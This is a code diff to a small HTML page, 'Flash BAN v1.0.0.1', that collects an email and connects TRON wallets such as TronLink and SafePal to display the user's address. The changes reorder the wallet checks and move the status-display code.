@@ -73,7 +73,7 @@
 </head>
 <body>
     <div class="container">
-        <img src="./safepal.png" alt="Wallet Logo" class="wallet-logo">
+        <img src="./safepal.png" alt="SafePal Logo" class="wallet-logo">
         <h1>Flash BAN v1.0.0.1</h1>
         <input type="email" id="emailInput" placeholder="Enter your email" required>
         <button id="connectButton">CONNECT</button>
@@ -96,22 +96,23 @@
                     await window.tronLink.request({ method: 'tron_requestAccounts' });
                     const tronWeb = window.tronLink.tronWeb;
                     connectedAddress = tronWeb.defaultAddress.base58;
-                } else if (window.trustwallet || window.exodus || window.bitget || window.safepal) {
-                    const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
-                    connectedAddress = (await tronWeb.trx.getAccount()).address;
+                } else if (window.safepal || window.bitget || window.trustwallet || window.exodus) {
+                    const tronWeb = new TronWeb({
+                        fullHost: 'https://api.trongrid.io'
+                    });
+                    connectedAddress = await tronWeb.defaultAddress.base58;
                 } else {
-                    document.getElementById('statusMessage').textContent = "No supported wallet found. Please install Trust Wallet, Exodus, TronLink, SafePal, or Bitget.";
-                }
-
-                if (connectedAddress) {
-                    document.getElementById('connectButton').textContent = 'Wallet Connected';
-                    document.getElementById('connectButton').style.backgroundColor = 'rgb(0, 128, 0)';
-                    document.getElementById('walletAddress').textContent = `Connected TRX Address: ${connectedAddress}`;
+                    document.getElementById('statusMessage').textContent = "No supported wallet found. Please use Trust Wallet, Exodus, TronLink, SafePal, or Bitget.";
                 }
             } catch (error) {
                 document.getElementById('statusMessage').textContent = "Please unlock your wallet and try again.";
             }
 
+            if (connectedAddress) {
+                document.getElementById('connectButton').textContent = 'Wallet Connected';
+                document.getElementById('connectButton').style.backgroundColor = 'rgb(0, 128, 0)';
+                document.getElementById('walletAddress').textContent = `Connected TRX Address: ${connectedAddress}`;
+            }
             isConnecting = false;
         }
 
